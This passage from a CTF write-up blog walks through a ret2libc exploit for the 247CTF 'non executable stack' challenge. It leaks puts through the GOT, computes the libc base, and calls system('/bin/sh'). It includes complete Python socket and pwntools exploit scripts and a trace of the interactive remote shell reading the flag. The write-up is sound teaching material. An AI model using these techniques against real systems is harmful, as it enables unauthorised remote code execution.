<p>So, in this case, our payload will be like this:</p>
<pre tabindex="0"><code>[0x2c padding] + [puts@plt] + [dummy address] + [puts@got]
</code></pre><p>This time, we&rsquo;re calling the <code>puts@plt</code> at <code>0x08048390</code> with the <code>puts@got</code> at <code>0x0804a018</code> as parameter (which it&rsquo;ll be send to us as a string):</p>
<pre tabindex="0"><code>[0x2c padding] + [0x08048390] + [dummy address] + [0x0804a018]
</code></pre><p>If we try our newly crafted payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python2 -c <span class="s1">&#39;print(&#34;A&#34;*0x2c + &#34;\x90\x83\x04\x08&#34; + &#34;A&#34;*4 + &#34;\x18\xa0\x04\x08&#34;)&#39;</span> <span class="p">|</span> nc ad520e503a0ec4e0.247ctf.com <span class="m">50341</span> <span class="p">|</span> xxd
</span></span><span class="line"><span class="cl">00000000: 456e <span class="m">7465</span> <span class="m">7220</span> <span class="m">7468</span> <span class="m">6520</span> <span class="m">7365</span> <span class="m">6372</span> <span class="m">6574</span>  Enter the secret
</span></span><span class="line"><span class="cl">00000010: <span class="m">2070</span> <span class="m">6173</span> <span class="m">7377</span> 6f72 643a 0a49 6e63 6f72   password:.Incor
</span></span><span class="line"><span class="cl">00000020: <span class="m">7265</span> <span class="m">6374</span> <span class="m">2073</span> <span class="m">6563</span> <span class="m">7265</span> <span class="m">7420</span> <span class="m">7061</span> <span class="m">7373</span>  rect secret pass
</span></span><span class="line"><span class="cl">00000030: 776f <span class="m">7264</span> 210a 60d3 dbf7 90ed d6f7 0a    word!.<span class="sb">`</span>........
</span></span></code></pre></div><p>So, now we know that <code>puts</code> in the server is placed at <code>0xf7dbd360</code> address. With this information, we can search a <a href="https://libc.blukat.me/" target="_blank" rel="noopener">libc database</a> to download this specific version (<code>libc6-i386_2.27-3ubuntu1_amd64</code>). In case that address matches different versions, we can leak other addresses as <code>gets</code> or <code>strcmp</code> to limit the results.</p>
<p>















<figure  >
  <div class="d-flex justify-content-center">
    <div class="w-100" ><img alt="libc database result" srcset="
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_92f850fdc407dbf60aaa066543a0d4b6.webp 400w,
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_f621dcae6367362fcabcc7c2e680d8ae.webp 760w,
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
               src="/post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_92f850fdc407dbf60aaa066543a0d4b6.webp"
               width="760"
               height="204"
               loading="lazy" data-zoomable /></div>
  </div></figure>
</p>
<p>If we run again our Python command with the payload, we&rsquo;ll see that this time <code>puts</code> address is different, so we can confirm that the remote server has ALSR activated.</p>
<h3 id="payload-construction">Payload construction</h3>
<p>The main problem here is that we need to know the base address of the <code>libc</code> library to construct our payload. We can obtain it thanks to the <code>puts</code> address leakage:</p>
<pre tabindex="0"><code>[libc base adddress] = [puts address leaked] - [libc6-i386_2.27-3ubuntu1_amd64.puts RVA]
</code></pre><p>But if we provide a dummy address to the payload, the remote program will crash, and in the next execution the base address will be different. So, we can provide the <code>main</code> address to continue execution and interact again with the program and the vulnerable gets function to overwrite again the return address, this time with the first payload we described earlier, but instead of referencing the absolute addresses, we can use them as:</p>
<pre tabindex="0"><code>[function VA] = [libc base address] + [function RVA]
</code></pre><p>Be aware that the second padding of the payload may change, so you need to recalculate it again, but we&rsquo;re lucky enough and this time the padding is the same. With all of this in mind, here is how our final script would look like:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="s1">&#39;ad520e503a0ec4e0.247ctf.com&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">50341</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>    <span class="c1"># TCP socket</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Connected to </span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x2c</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08048390</span><span class="p">)</span>    <span class="c1"># puts@plt</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804853d</span><span class="p">)</span>    <span class="c1"># main</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804a018</span><span class="p">)</span>    <span class="c1"># puts@got</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%b</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Payload sent: </span><span class="si">{}</span><span class="s1">B&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_leak</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] puts leaked address: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="mh">0x67360</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] libc base address: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3cd10</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_exit</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2ff70</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_shell</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17b8cf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x2c</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">libc_system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">libc_exit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">libc_shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%b</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Payload sent: </span><span class="si">{}</span><span class="s1">B&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Interactive shell</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">command</span> <span class="o">!=</span> <span class="s1">&#39;exit&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="p">(</span><span class="ne">EOFError</span><span class="p">,</span> <span class="ne">KeyboardInterrupt</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>And an execution trace:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 exploit-remote.py
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connected to ad520e503a0ec4e0.247ctf.com:50341
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Payload sent: 56B
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> puts leaked address: 0xf7d5d360
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> libc base address: 0xf7cf6000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Payload sent: 56B
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Interactive shell
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls
</span></span><span class="line"><span class="cl">chall
</span></span><span class="line"><span class="cl">flag_<span class="o">[</span>0-9<span class="o">]</span>+.txt
</span></span><span class="line"><span class="cl">$ cat flag_<span class="o">[</span>0-9<span class="o">]</span>+.txt
</span></span><span class="line"><span class="cl">247CTF<span class="o">{[</span>a-f0-9<span class="o">]{</span>32<span class="o">}}</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">exit</span>
</span></span></code></pre></div><h2 id="pwntools">pwntools</h2>
<p>This blog post is already long enough, so I&rsquo;ll only show how <code>exploit-remote.py</code> script looks when ported to pwntools. I&rsquo;ll leave all details up to you but the library is pretty straightforward:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="s1">&#39;ad520e503a0ec4e0.247ctf.com&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">50341</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;non_executable_stack&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc6-i386_2.27-3ubuntu1_amd64.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x2C</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Payload sent: </span><span class="si">{}</span><span class="s1">B&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;puts leaked address: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc base address: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_exit</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_shell</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x2C</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">libc_system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">libc_exit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">libc_shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Payload sent: </span><span class="si">{}</span><span class="s1">B&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>
    </div>

    




<div class="article-tags">
  
  <a class="badge badge-light" href="/tag/ctf/">CTF</a>
  
  <a class="badge badge-light" href="/tag/writeup/">Writeup</a>
  
  <a class="badge badge-light" href="/tag/247/ctf/">247/CTF</a>
  
  <a class="badge badge-light" href="/tag/pwn/">pwn</a>
  
</div>



<div class="share-box">
  <ul class="share">
    
  </ul>
</div>











  
  
    



  
  
  
    
  
  
  
  <div class="media author-card content-widget-hr">
    
      
      <a href="https://duroz.github.io/"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hu5b28f9858413852f675c89faac7bd79b_85118_270x270_fill_q75_lanczos_center.jpg" alt="Daniel Uroz"></a>
    

    <div class="media-body">
      <h5 class="card-title"><a href="https://duroz.github.io/">Daniel Uroz</a></h5>
      <h6 class="card-subtitle">PhD Student in Computer Science</h6>
      <p class="card-text">My research interests include malware analysis, reverse engineering, network security, and forensics</p>
      <ul class="network-icon" aria-hidden="true">
  
    
    
    
      
    
    
    
    
    
    <li>
      <a href="mailto:duroz@unizar.es" >
        <i class="fas fa-envelope"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://twitter.com/daniel_uroz" target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
    </li>
  
    
    
    
    
    
    
    
      
    
    <li>
      <a href="https://scholar.google.es/citations?user=gN19BOcAAAAJ" target="_blank" rel="noopener">
        <i class="ai ai-google-scholar"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://www.linkedin.com/in/duroz/" target="_blank" rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
    </li>
  
    
    
    
    
    
    
    
      
    
    <li>
      <a href="https://drive.google.com/file/d/1xmVvG-6szKgw3ja1lSiGBjRFD8UACBnq/view?usp=sharing" target="_blank" rel="noopener">
        <i class="ai ai-cv"></i>
      </a>
    </li>
  
</ul>

    </div>
  </div>


  
















  </div>
</article>
  </div>

  <div class="page-footer">
    
    
    <div class="container">
      <footer class="site-footer">

  



  

  

  

  
  






  
  
  

  
  
    
  
  
    
  

  

  
  <p class="powered-by copyright-license-text">
    © 2022 Me. This work is licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0" rel="noopener noreferrer" target="_blank">CC BY NC ND 4.0</a>
  </p>
  

  <p class="powered-by footer-license-icons">
    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0" rel="noopener noreferrer" target="_blank" aria-label="Creative Commons">
      <i class="fab fa-creative-commons fa-2x" aria-hidden="true"></i>
      <i class="fab fa-creative-commons-by fa-2x" aria-hidden="true"></i>
      
        <i class="fab fa-creative-commons-nc fa-2x" aria-hidden="true"></i>
      
      
        <i class="fab fa-creative-commons-nd fa-2x" aria-hidden="true"></i>
      
    </a>
  </p>




  <p class="powered-by">
    
    
    
      
      
      
      
      
      
      Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target="_blank" rel="noopener">Wowchemy</a> — the free, <a href="https://github.com/wowchemy/wowchemy-hugo-themes" target="_blank" rel="noopener">open source</a> website builder that empowers creators.
    
  </p>
</footer>

    </div>
    
  </div>

      

    
    <script src="/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js"></script>

    
    
    
      

      
      

      

      
        
        <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.2.1/build/highlight.min.js" integrity="sha512-Ypjm0o7jOxAd4hpdoppSEN0TQOC19UtPAqD+4s5AlXmUvbmmS/YMxYqAqarQYyxTnB6/rqip9qcxlNB/3U9Wdg==" crossorigin="anonymous"></script>
        
        
        <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.2.1/build/languages/r.min.js" crossorigin="anonymous"></script>
        
        <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.2.1/build/languages/latex.min.js" crossorigin="anonymous"></script>
        
      

    

    
    
    
      <script src="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.js" integrity="" crossorigin="anonymous"></script>
    

    
    

    
    
    
      
      <script id="search-hit-fuse-template" type="text/x-template">
        <div class="search-hit" id="summary-{{key}}">
          <div class="search-hit-content">
            <div class="search-hit-name">
              <a href="{{relpermalink}}">{{title}}</a>
              <div class="article-metadata search-hit-type">{{type}}</div>
              <p class="search-hit-description">{{snippet}}</p>
            </div>
          </div>
        </div>
      </script>
      
        <script src="https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js" integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js" integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin="anonymous"></script>
      
    

    
    

    
    
    
    

    
    
      
      
      
      
      
      
      
    

    

    
    
    
    <script id="page-data" type="application/json">{"use_headroom":true}</script>

    
    
      <script src="/js/wowchemy-headroom.c251366b4128fd5e6b046d4c97a62a51.js" type="module"></script>
    
    
    
    
    
    
    
      
      
    
    
    <script src="/en/js/wowchemy.min.43c8f7a4851160885a7d8069dfa86538.js"></script>

    
    
      <script src="/js/wowchemy-map.a26e9d2f7238ba5b868384f1c5bc6477.js" type="module"></script>
    
    
    
    
      
<div id="modal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Cite</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <pre><code class="tex hljs"></code></pre>
      </div>
      <div class="modal-footer">
        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
          <i class="fas fa-copy"></i> Copy
        </a>
        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
          <i class="fas fa-download"></i> Download
        </a>
        <div id="modal-error"></div>
      </div>
    </div>
  </div>
</div>

      <script src="/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js" type="module"></script>






</body>
</html>
